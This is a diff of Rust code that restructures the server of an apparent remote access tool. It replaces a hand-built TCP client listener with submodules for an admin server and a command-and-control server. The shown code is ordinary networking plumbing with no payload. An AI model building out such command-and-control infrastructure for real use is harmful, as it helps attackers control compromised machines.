@@ -1,138 +1,30 @@
-use std::collections::HashMap;
-use std::io;
-use std::net::SocketAddr;
 use std::sync::Arc;
 
-use async_trait::async_trait;
-use log::info;
-use rat_common::module::{Module, ModuleState};
-use tokio::net::{TcpListener, TcpStream, ToSocketAddrs};
-use tokio::sync::{Mutex, mpsc};
-use tokio::task::JoinHandle;
+use rat_common::composite_module_impl;
+use rat_common::module::{Module, ModuleImpl, ModuleState};
+use tokio::net::ToSocketAddrs;
 
-use crate::message::InternalMessage;
-use crate::modules::admin::Admin;
-use crate::modules::connection::connector::Connector;
-
-const _MAX_QUEUED_MESSAGES: usize = 100;
-type _ClientMap = HashMap<SocketAddr, (Arc<Connector>, JoinHandle<()>)>;
+use crate::modules::admin::AdminServer;
+use crate::modules::cc::CCServer;
 
 pub struct Server {
-    _listener: TcpListener,
-    _notifier: mpsc::Sender<InternalMessage>,
-    _receiver: Mutex<mpsc::Receiver<InternalMessage>>,
-    _clients: Mutex<_ClientMap>,
-    _admin: Arc<Admin>,
-    _admin_task: Mutex<Option<JoinHandle<()>>>,
     _state: Arc<ModuleState>,
+    _submodules: Vec<Arc<dyn Module>>,
 }
 
 impl Server {
-    pub async fn bind<A1: ToSocketAddrs, A2: ToSocketAddrs>(
-        addr: A1,
-        admin_addr: A2,
-    ) -> anyhow::Result<Arc<Self>> {
-        let listener = TcpListener::bind(addr).await?;
-        let (sender, receiver) = mpsc::channel(_MAX_QUEUED_MESSAGES);
-
-        let admin_listener = TcpListener::bind(admin_addr).await?;
-        Ok(Arc::new_cyclic(|this| Self {
-            _listener: listener,
-            _notifier: sender,
-            _receiver: Mutex::new(receiver),
-            _clients: Mutex::new(HashMap::new()),
-            _admin: Arc::new(Admin::new(this.clone(), admin_listener)),
-            _admin_task: Mutex::new(None),
-            _state: Arc::new(ModuleState::new()),
+    pub async fn bind<A1, A2>(admin_addr: A1, cc_addr: A2) -> anyhow::Result<Arc<Self>>
+    where
+        A1: ToSocketAddrs + Clone + Send + Sync + 'static,
+        A2: ToSocketAddrs,
+    {
+        let admin = AdminServer::bind(admin_addr).await?;
+        let cc = CCServer::bind(cc_addr).await?;
+        Ok(Arc::new(Self {
+            _state: ModuleState::new(),
+            _submodules: vec![admin, cc],
         }))
     }
-
-    pub async fn receive(&self) -> Option<InternalMessage> {
-        let mut receiver = self._receiver.lock().await;
-        receiver.recv().await
-    }
-
-    pub async fn list_clients(&self) -> Vec<SocketAddr> {
-        let clients = self._clients.lock().await;
-        clients.keys().cloned().collect()
-    }
 }
 
-#[async_trait]
-impl Module for Server {
-    type EventType = io::Result<(TcpStream, SocketAddr)>;
-
-    fn name(&self) -> &str {
-        "Server"
-    }
-
-    fn state(&self) -> Arc<ModuleState> {
-        self._state.clone()
-    }
-
-    async fn listen(self: Arc<Self>) -> Self::EventType {
-        self._listener.accept().await
-    }
-
-    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
-        let (stream, addr) = event?;
-        self._notifier
-            .send(InternalMessage::Connect { peer: addr })
-            .await?;
-        info!("New connection from {addr}");
-
-        let connector = Arc::new(Connector::new(stream, addr, self._notifier.clone()));
-        let connector_cloned = connector.clone();
-
-        let self_cloned = self.clone();
-        let handle = tokio::spawn(async move {
-            let _ = connector_cloned.run().await;
-
-            let mut clients = self_cloned._clients.lock().await;
-            let _ = clients.remove(&addr);
-            info!("{addr} disconnected");
-        });
-
-        let mut clients = self._clients.lock().await;
-        clients.insert(addr, (connector, handle));
-
-        Ok(())
-    }
-
-    async fn before_hook(self: Arc<Self>) -> anyhow::Result<()> {
-        let mut admin_task = self._admin_task.lock().await;
-        let admin = self._admin.clone();
-        admin_task.replace(tokio::spawn(async move {
-            let _ = admin.run().await;
-        }));
-
-        Ok(())
-    }
-
-    async fn after_hook(self: Arc<Self>) -> anyhow::Result<()> {
-        let mut handles = vec![];
-
-        let mut clients = self._clients.lock().await;
-        for (_, (connector, handle)) in clients.drain() {
-            connector.stop();
-
-            // Do not wait for handles here to avoid deadlocks
-            handles.push(handle);
-        }
-
-        drop(clients);
-
-        for handle in handles {
-            let _ = handle.await;
-        }
-
-        self._admin.stop();
-
-        let mut admin_task = self._admin_task.lock().await;
-        if let Some(handle) = admin_task.take() {
-            let _ = handle.await;
-        }
-
-        Ok(())
-    }
-}
+composite_module_impl!(Server, "Server", _state, _submodules);
